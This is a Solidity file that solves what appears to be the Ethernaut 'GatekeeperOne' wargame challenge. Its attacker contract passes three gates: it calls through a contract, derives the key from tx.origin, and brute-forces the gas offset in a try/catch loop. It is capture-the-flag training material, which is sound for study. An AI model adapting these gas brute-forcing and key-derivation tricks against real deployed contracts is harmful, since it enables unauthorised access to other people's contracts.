// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        // console.log("in gateOne");
        require(msg.sender != tx.origin);
        // console.log("pass gateOne");
        _;
    }

    modifier gateTwo() {
        // 测试 gateTwo时，不能使用console.log, 因为这个命令也会消耗gas，导致最终测试出来的gas不对
        // console.log("in gateTwo");
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        // console.log("in gateThree");
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        // console.log("pass gateThree1");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        // console.log("pass gateThree2");
        // console.log("tx.origin: %s", tx.origin);
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        // console.log("pass gateThree");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        // console.log("succ!");
        return true;
    }
}

contract GatekeeperBridge {
    GatekeeperOne private gatekeeperone;

    constructor(address _gatekeeperone) {
        gatekeeperone = GatekeeperOne(_gatekeeperone);
    }

    function myCall() external {
        uint64 lastTwoBytesAsInt = uint64(uint16(uint160(tx.origin)));
        uint64 gateKey = uint64(bytes8(hex"01020304000000")) + lastTwoBytesAsInt;
        // console.log("mycall tx.origin: %s, msg.sender: %s", tx.origin, msg.sender);
        for (uint256 gas1 = 0; gas1 < 8000; gas1++) {
            try gatekeeperone.enter{gas: 8191 * 3 + gas1}(bytes8(gateKey)) {
                console.log("target gas: %s", gas1);
                break;
            } catch (bytes memory reason) {
                // console.log("revert reason: %s", string(reason));
                continue;
            }
        }
    }
}
